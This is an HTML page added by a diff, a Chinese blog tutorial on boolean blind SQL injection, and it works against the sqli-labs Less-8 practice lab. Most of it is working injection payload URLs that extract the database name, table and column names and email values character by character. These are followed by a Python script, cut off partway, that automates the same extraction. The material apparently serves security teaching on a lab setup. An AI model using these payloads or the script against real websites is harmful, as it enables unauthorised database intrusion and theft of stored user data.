@@ -1,0 +1,226 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>sql注入之盲注 | liuqi</title>
+  <meta name="author" content="liuqi">
+  
+  <meta name="description" content="吃吃睡睡终其一生">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="sql注入之盲注"/>
+  <meta property="og:site_name" content="liuqi"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">liuqi</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-07T00:35:30.000Z"><a href="/2016/07/07/sql注入之盲注/">2016-07-07</a></time>
+      
+      
+  
+    <h1 class="title">sql注入之盲注</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>特点：当页面存在注入，但是没有显示位，且没有用echo “mysql_error()”输出错误信息时可以用，<br>它一次只能猜测一个字节，速度慢，但是只要存在注入就能用<br>用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) –+<br>根据返回页面是否相同来得到数据<br>注入步骤</p>
+<pre><code>找注入点、猜闭合字符
+猜解列数、尝试得到显示位
+猜数据库名
+猜表名
+猜列名
+猜列值
+</code></pre><ol>
+<li>找到注入点，判断闭合字符</li>
+<li>尝试猜解列数，得到显示位，并不能爆出显示位</li>
+<li>得到数据库名<br>4.得到表名<br>5得到列名<br>6得到列值<br>EXISTS 是判断是否存在,和in类似,但效率要比in高</li>
+</ol>
+<p>SELECT * FROM  EMP (基础表)  WHERE  EMPNO &gt; 0  AND  EXISTS (SELECT ‘X’  FROM DEPT  WHERE  DEPT.DEPTNO = EMP.DEPTNO  AND  LOC = ‘MELB’)</p>
+<p>SELECT  * FROM  EMP (基础表)  WHERE  EMPNO &gt; 0  AND  DEPTNO IN(SELECT DEPTNO  FROM  DEPT  WHERE  LOC = ‘MELB’)</p>
+<p>这两句效果一样<br>ASCII(str)</p>
+<p>返回最左边的字符的字符串str的数值。如果str是空字符串，返回0<br>———————-+<br>                   53 |<br>———————-+</p>
+<p>SUBSTR函数是用来截取数据库某一列字段中的一部分。<br>这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。</p>
+<p>需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始。</p>
+<p>这点也很好理解，因为数据库不是我们平时写程序，他有他自己的一套习惯，数据库的记录都是从1开始没有从0开始。是吧。</p>
+<p>mysql&gt; select substr(“ashdgfh”,2,1);<br>+———————–+<br>| substr(“ashdgfh”,2,1) |<br>+———————–+<br>| s                     |<br>+———————–+<br>1 row in set (0.00 sec)</p>
+<p>mysql&gt; select substr(“ashdgfh”,2,2);<br>+———————–+<br>| substr(“ashdgfh”,2,2) |<br>+———————–+<br>| sh                    |<br>+———————–+<br>1 row in set (0.00 sec)</p>
+<p>mysql&gt; select (select ascii(substr((select user()),1,1)))&gt;100;<br>+————————————————-+<br>| (select ascii(substr((select user()),1,1)))&gt;100 |<br>+————————————————-+<br>|                                               1 |<br>+————————————————-+<br>1 row in set (0.00 sec)</p>
+<p>mysql&gt; select (select ascii(substr((select user()),1,1)))&gt;120;<br>+————————————————-+<br>| (select ascii(substr((select user()),1,1)))&gt;120 |<br>+————————————————-+<br>|                                               0 |<br>+————————————————-+<br>1 row in set (0.00 sec)</p>
+<p><a href="http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1</a>‘<br>and (select length((select database()))&gt;8) –+    长度是8位 8不正常<br><a href="http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1</a>‘<br>and (select ascii(select (substr((select database()),1,1))&gt;113) –+</p>
+<pre><code>115
+</code></pre><p><a href="http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1</a>‘<br>and (select ascii (substr((select database()),1,1))&gt;115)<br>–+</p>
+<p><a href="http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1:8088/sqli-labs-master/Less-8/?id=1</a>‘<br>and ((select count(table_name) from information_schema.tables where table_schem<br>a=’security’)</p>
+<blockquote>
+<p>4)<br>–+  判断数据库有几张表</p>
+</blockquote>
+<p>判断有多少张表<br>mysql&gt; select count(table_name) from information_schema.tables where table_schem<br>a=database();<br>+——————-+<br>| count(table_name) |<br>+——————-+<br>|                 5 |<br>+——————-+<br>1 row in set (0.00 sec)</p>
+<p>mysql&gt; use information_schema;<br>Database changed<br>mysql&gt; select count(table_name) from information_schema.tables where table_schem<br>a=’security’;<br>+——————-+<br>| count(table_name) |<br>+——————-+<br>|                 5 |<br>+——————-+<br>1 row in set (0.00 sec)</p>
+<p>select count(table_name) from information_schema.tables where table_schem<br>a=’security’;</p>
+<p>select ascii(substr((select table_name from information_schema.tables whe<br>re table_schema=database() limit 0,1),1,1))&gt;100;</p>
+<p>首先判断长度</p>
+<p><a href="http://127.0.0.1/sqli/Less-8/?id=1" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/?id=1</a>‘ and (select length((select database()))&gt;8) –+   证明长度返回为8<br><a href="http://127.0.0.1/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/</a> ?id=1’ and (select ascii(substr((select database()),1,1)) &gt;115) –+  判断第一个字符为ascii码为115<br><a href="http://127.0.0.1/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/</a> ?id=1’ and (select ascii(substr((select database()),2,1)) &gt;101) –+    第二个字符       101<br><a href="http://127.0.0.1/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/</a> ?id=1’ and (select ascii(substr((select database()),8,1)) &gt;121) –+     第二个字符       121<br><a href="http://127.0.0.1/sqli/Less-8/" target="_blank" rel="external">http://127.0.0.1/sqli/Less-8/</a> ?id=1’ and (select (ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 1,1),1,1)))&gt;114.) –+<br>该security库中 第二个表的表名第一个字的ascii码为114<br>ascii(substr())</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and length(version())=6<br> –+</p>
+<h1 id="判断表存在不存在"><a href="#判断表存在不存在" class="headerlink" title="判断表存在不存在"></a>判断表存在不存在</h1><p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and exists(select * from information_schema.tables)<br> –+</p>
+<h1 id="判断version-返回字符串-长度"><a href="#判断version-返回字符串-长度" class="headerlink" title="判断version()返回字符串 长度"></a>判断version()返回字符串 长度</h1><p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select length(version()))=6<br> –+</p>
+<h1 id="判断有多少个库"><a href="#判断有多少个库" class="headerlink" title="判断有多少个库"></a>判断有多少个库</h1><p>select count(distinct+table_schema) from information_schema.tables</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select count(distinct+table_schema) from information_schema.tables) &gt; 10<br> –+        </p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select count(distinct+table_schema) from information_schema.tables) &gt;3<br> –+</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select count(distinct+table_schema) from information_schema.tables) =4<br> –+</p>
+<h1 id="判断每一个库名"><a href="#判断每一个库名" class="headerlink" title="判断每一个库名"></a>判断每一个库名</h1><p>select distinct table_schema from information_schema.tables limit 0,1</p>
+<p>select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1));;</p>
+<p>第一个库的第一个字符<br><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1))) &gt; 100<br> –+</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1))) &gt; 105<br> –+</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1))) &gt; 104<br> –+</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 1 ,1))) = 105<br> –+</p>
+<p>依次类推</p>
+<p>第一个库的第二个字符<br><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 2 ,1))) &gt; 100<br> –+</p>
+<p><a href="http://172.21.50.66/Less-8/" target="_blank" rel="external">http://172.21.50.66/Less-8/</a><br>?id=1’<br>and (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1), 2 ,1)))  = 110<br> –+</p>
+<h1 id="判断某个库有多少个表"><a href="#判断某个库有多少个表" class="headerlink" title="判断某个库有多少个表"></a>判断某个库有多少个表</h1><p>bool型注入漏洞分析<br>1.判断当前数据库<br>查出数据库的ascii码，然后转换为字符串<br>select ascii(substr(select database()),1,1)<br>2.知道数据库名之后判断数据库有多少表<br>3.获取第一个表的字符的ascii码然后之后的获取之后的<br>4.知道表的名字之后获取内容</p>
+<h1 id="课堂演示"><a href="#课堂演示" class="headerlink" title="课堂演示"></a>课堂演示</h1><figure class="highlight plain"><figcaption><span>--+</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">select database()</div><div class="line"></div><div class="line">http://172.21.50.66/Less-8/?id=1&apos; </div><div class="line">and (select length((select database())) &gt; 8)</div><div class="line"> --+</div></pre></td></tr></table></figure>
+<p>长度( length(select database()) ): 8<br>当前数据库第一个字符的ascii码<br><figure class="highlight plain"><figcaption><span>ascii(substr((select database()), 1, 1))</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://172.21.50.66/Less-8/?id=1&apos; </div><div class="line">and (select ascii(substr((select database()), 1, 1)) &gt; 114)</div><div class="line"> --+</div></pre></td></tr></table></figure></p>
+<p>当前数据库第一个字符的ascii码 = 115   s<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">and (select ascii(substr((select database()), 2, 1)) &gt; 101)</div><div class="line"> --+</div></pre></td></tr></table></figure></p>
+<p>当前数据库第2个字符的ascii码 = 101   e</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">and (select ascii(substr((select database()), 8, 1)) = 121)</div><div class="line"> --+</div></pre></td></tr></table></figure>
+<p>当前数据库第8个字符的ascii码 = 121   y</p>
+<h1 id="当前数据库有多少个表"><a href="#当前数据库有多少个表" class="headerlink" title="当前数据库有多少个表"></a>当前数据库有多少个表</h1><figure class="highlight plain"><figcaption><span>count(table_name) from information_schema.tables where table_schema=database()</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;</div><div class="line"></div><div class="line">select count(table_name) from information_schema.tables where table_schema=0x7365637572697479</div><div class="line"></div><div class="line"></div><div class="line">http://172.21.50.66/Less-8/?id=1&apos; </div><div class="line">and ((select count(table_name) from information_schema.tables where table_schema=0x7365637572697479) &gt; 4)</div><div class="line"> --+</div></pre></td></tr></table></figure>
+<p>当前数据库有多少个表  : 4</p>
+<h1 id="获取当前数据库的第一个表的第一个字符的length"><a href="#获取当前数据库的第一个表的第一个字符的length" class="headerlink" title="获取当前数据库的第一个表的第一个字符的length"></a>获取当前数据库的第一个表的第一个字符的length</h1><figure class="highlight plain"><figcaption><span>length((select table_name from information_schema.tables where table_schema=database() limit 0,1))</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">http://172.21.50.66/Less-8/?id=1&apos; </div><div class="line">and ((select length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) &gt; 5)</div><div class="line"> --+</div></pre></td></tr></table></figure>
+<p> 获取当前数据库的第一个表的第一个字符的length: 6</p>
+<h1 id="获取当前数据库的第一个表的第一个字符的ascii"><a href="#获取当前数据库的第一个表的第一个字符的ascii" class="headerlink" title="获取当前数据库的第一个表的第一个字符的ascii"></a>获取当前数据库的第一个表的第一个字符的ascii</h1><figure class="highlight plain"><figcaption><span>ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1))</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">http://172.21.50.66/Less-8/?id=1&apos; </div><div class="line">and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1)) &gt; 100)</div><div class="line"> --+</div></pre></td></tr></table></figure>
+<p>获取当前数据库的第一个表的第一个字符的ascii: 101</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 2, 1)) &gt; 109)</div><div class="line"> --+</div></pre></td></tr></table></figure>
+<p>获取当前数据库的第一个表的第2个字符的ascii: 109</p>
+<h1 id="获取当前数据库的emails表的第1列-列名的第1个字符的length"><a href="#获取当前数据库的emails表的第1列-列名的第1个字符的length" class="headerlink" title="获取当前数据库的emails表的第1列 列名的第1个字符的length"></a>获取当前数据库的emails表的第1列 列名的第1个字符的length</h1><figure class="highlight plain"><figcaption><span>length(column_name) from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">http://172.21.50.66/Less-8/?id=1&apos; </div><div class="line">and ((select length(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;emails&apos; limit 0,1) &gt; 2)</div><div class="line"> --+</div></pre></td></tr></table></figure>
+<p>获取当前数据库的emails表的第1列 列名的第1个字符的length : 2</p>
+<h1 id="获取当前数据库的emails表的第1列-列名"><a href="#获取当前数据库的emails表的第1列-列名" class="headerlink" title="获取当前数据库的emails表的第1列 列名"></a>获取当前数据库的emails表的第1列 列名</h1><figure class="highlight plain"><figcaption><span>ascii(substr(column_name, 1, 1)) from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">http://172.21.50.66/Less-8/?id=1&apos; </div><div class="line">and ((select ascii(substr(column_name, 1, 1)) from information_schema.columns where table_schema=database() and table_name=&apos;emails&apos; limit 0,1) &gt; 104)</div><div class="line"> --+</div></pre></td></tr></table></figure>
+<p> 105</p>
+<h1 id="获取内容"><a href="#获取内容" class="headerlink" title="获取内容"></a>获取内容</h1><figure class="highlight plain"><figcaption><span>length(email_id) from emails limit 0,1</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">http://172.21.50.66/Less-8/?id=1&apos; </div><div class="line">and ((select length(email_id) from emails limit 0,1) &gt; 16)</div><div class="line"> --+</div><div class="line"></div><div class="line">length : 16 </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">select email_id from emails limit 0,1</div><div class="line"></div><div class="line">select ascii(substr(email_id, 1, 1)) from emails limit 0,1</div><div class="line"></div><div class="line"></div><div class="line">http://172.21.50.66/Less-8/?id=1&apos; </div><div class="line">and ((select ascii(substr(email_id, 1, 1)) from emails limit 0,1) &gt; 67)</div><div class="line"> --+</div><div class="line"></div><div class="line"></div><div class="line"> 68 </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">http://172.21.50.66/Less-8/?id=1&apos; </div><div class="line">and ((select ascii(substr(email_id, 2, 1)) from emails limit 0,1) &gt; 116)</div><div class="line"> --+</div><div class="line"></div><div class="line"></div><div class="line">117</div><div class="line"></div><div class="line"></div><div class="line">http://172.21.50.66/Less-8/?id=1&apos; </div><div class="line">and ((select ascii(substr(email_id, 3, 1)) from emails limit 0,1) &gt; 109)</div><div class="line"> --+</div><div class="line"></div><div class="line"> 109</div></pre></td></tr></table></figure>
+<p>附上代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div></pre></td><td class="code"><pre><div class="line">#cding=utf-8</div><div class="line">import re</div><div class="line">import sys</div><div class="line">import requests</div><div class="line">import binascii</div><div class="line"></div><div class="line">def getAllDatabases(url):</div><div class="line">    num = 1</div><div class="line">    while(True):</div><div class="line">        db_url = url + &quot;&apos; and (select length((select database())) &gt; %d) --+&quot; % num</div><div class="line">        res = requests.get(db_url)</div><div class="line">        con = res.content</div><div class="line">        db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))</div><div class="line">        num += 1</div><div class="line">        if db_num is None:</div><div class="line">            break</div><div class="line">    print (&quot;Database Length: %d&quot; % (num-1))</div><div class="line">    le = num</div><div class="line">    db = []</div><div class="line">    for index in range(1,le):</div><div class="line">        num = 1</div><div class="line">        while(True):</div><div class="line">            db_url = url + &quot;&apos; and (select ascii(substr((select database()), %d, 1)) &gt; %d) --+&quot; % (index,num)</div><div class="line">            res = requests.get(db_url)</div><div class="line">            con = res.content</div><div class="line">            db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))</div><div class="line">            num += 1</div><div class="line">            if db_num is None:</div><div class="line">                break</div><div class="line">        db.append(chr(num - 1))</div><div class="line">    data_name = &apos;&apos;.join(db)</div><div class="line">    print (&quot;Database : %s&quot; % data_name)</div><div class="line">def getAlltables(url,db_name):</div><div class="line">    num = 1</div><div class="line">    # db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)</div><div class="line">    db_name_hex = &quot;0x7365637572697479&quot;</div><div class="line">    while(True):</div><div class="line">        db_url = url + &quot;&apos; and ((select count(table_name) from information_schema.tables where table_schema=%s) &gt; %d) --+&quot; % (db_name_hex,num)</div><div class="line">        res = requests.get(db_url)</div><div class="line">        con = res.content</div><div class="line">        db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))</div><div class="line">        num += 1</div><div class="line">        if db_num is None:</div><div class="line">            break</div><div class="line">    print (&quot;Table number: %d&quot; % (num-1))</div><div class="line">    lol = num - 1</div><div class="line">    le = num  #le=5</div><div class="line">    db = []</div><div class="line">    for le in range(0,(le-1)):</div><div class="line">        num = 1</div><div class="line">        while(True):</div><div class="line">            table_url = url + &quot;&apos; and ((select length((select table_name from information_schema.tables where table_schema=database() limit %d,1))) &gt; %d) --+&quot; % (le,num)</div><div class="line">            # print (table_url)</div><div class="line">            res = requests.get(table_url)</div><div class="line">            con = res.content</div><div class="line">            db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))</div><div class="line">            if db_num is None:</div><div class="line">                break</div><div class="line">            else:</div><div class="line">                num += 1</div><div class="line">        db.append(num)</div><div class="line">    print (db)</div><div class="line">    tab = []</div><div class="line">    for l in range(0,lol):</div><div class="line">        dx = []</div><div class="line">        x = db[l] + 1</div><div class="line">        for index in range(1,x):</div><div class="line">            num = 1</div><div class="line">            while(True):</div><div class="line">                db_url = url + &quot;&apos; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1), %d, 1)) &gt; %d) --+&quot; % (l,index,num)</div><div class="line">                res = requests.get(db_url)</div><div class="line">                con = res.content</div><div class="line">                db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))</div><div class="line">                if db_num is None:</div><div class="line">                    break</div><div class="line">                else:</div><div class="line">                    num += 1</div><div class="line">            print (&quot;Table %d is : %s&quot; % (index,chr(num)))</div><div class="line">            dx.append(chr(num))</div><div class="line">        data_name = &apos;&apos;.join(dx)</div><div class="line">        print (&quot;The %d table : %s&quot; % ((l+1),data_name))</div><div class="line">        tab.append(data_name)</div><div class="line">    print (&quot;Database: %s&quot; % db_name)</div><div class="line">    for h in tab:</div><div class="line">        print (&quot;|    %s&quot; % h)</div><div class="line">def getAllcolumns(url,database,table):</div><div class="line">    num = 1</div><div class="line">    # db_name_hex = &quot;0x&quot; + binascii.b2a_hex(database)</div><div class="line">    # table_name_hex = &quot;0x&quot; + binascii.b2a_hex(table)</div><div class="line">    db_name_hex = &quot;0x7365637572697479&quot;</div><div class="line">    table_name_hex = &quot;0x7573657273&quot;</div><div class="line">    while(True):</div><div class="line">        db_url = url + &quot;&apos; and ((select count(column_name) from information_schema.columns where table_schema=database() and table_name=%s limit 0,1) &gt; %d) --+&quot; % (table_name_hex,num)</div><div class="line">        res = requests.get(db_url)</div><div class="line">        con = res.content</div><div class="line">        db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))</div><div class="line">        num += 1</div><div class="line">        if db_num is None:</div><div class="line">            break</div><div class="line">    print (&quot;column number: %d&quot; % (num-1))</div><div class="line">    lol = (num-1)</div><div class="line">    column_num = []</div><div class="line">    for x in range(0,(num-1)):</div><div class="line">        num_col = 1</div><div class="line">        while(True):</div><div class="line">            db_url = url + &quot;&apos; and ((select length(column_name) from information_schema.columns where table_schema=database() and table_name=%s limit %d,1) &gt; %d) --+&quot; % (table_name_hex,x,num_col)</div><div class="line">            # print (db_url)</div><div class="line">            res = requests.get(db_url)</div><div class="line">            con = res.content</div><div class="line">            db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))</div><div class="line">            if db_num is None:</div><div class="line">                break</div><div class="line">            else:</div><div class="line">                num_col += 1</div><div class="line">        column_num.append(num_col)</div><div class="line">        print (&quot;column %d number: %d&quot; % ((x+1),num_col))</div><div class="line">    tab = []</div><div class="line">    for l in range(0,lol):</div><div class="line">        dx = []</div><div class="line">        x = column_num[l] + 1</div><div class="line">        for index in range(1,x):</div><div class="line">            num = 1</div><div class="line">            while(True):</div><div class="line">                db_url = url + &quot;&apos; and ((select ascii(substr(column_name, %d, 1)) from information_schema.columns where table_schema=database() and table_name=%s limit %d,1) &gt; %d) --+&quot; % (index,table_name_hex,l,num)</div><div class="line">                res = requests.get(db_url)</div><div class="line">                con = res.content</div><div class="line">                db_num = re.search(r&apos;size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;(.*?)&lt;br&gt;&lt;/font&gt;&apos;,con.decode(&apos;utf8&apos;))</div><div class="line">                if db_num is None:</div><div class="line">                    break</div><div class="line">                else:</div><div class="line">                    num += 1</div><div class="line">            print (&quot;Table %d is : %s&quot; % (index,chr(num)))</div><div class="line">            dx.append(chr(num))</div><div class="line">        data_name = &apos;&apos;.join(dx)</div><div class="line">        print (&quot;The %d column : 